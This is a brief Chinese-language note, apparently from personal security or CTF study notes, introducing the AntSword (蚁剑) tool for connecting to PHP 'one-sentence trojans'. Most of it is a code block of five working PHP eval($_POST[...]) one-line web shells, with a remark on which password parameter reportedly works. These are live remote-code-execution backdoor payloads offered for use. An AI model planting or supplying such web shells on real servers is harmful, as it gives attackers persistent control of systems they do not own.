## 简介

蚁剑，用于连接一句话木马。

能连接的前提是提交到远程网站的文件可以被远程访问

特别的是，蚁剑的一句话木马的密码部分不一定都可以被使用。

例如以下的内容可能都不能使用，可能cmd部分被杀了。

```bash
<?php phpinfo(); @eval($_POST['shell']); ?>
<?php eval($_POST['password']);?>
<?php @eval($_POST['attack']);?>
<?php @eval($_POST["shell"]);?>


//这个就可以使用
<?php @eval($_POST["pass"]);?>
```

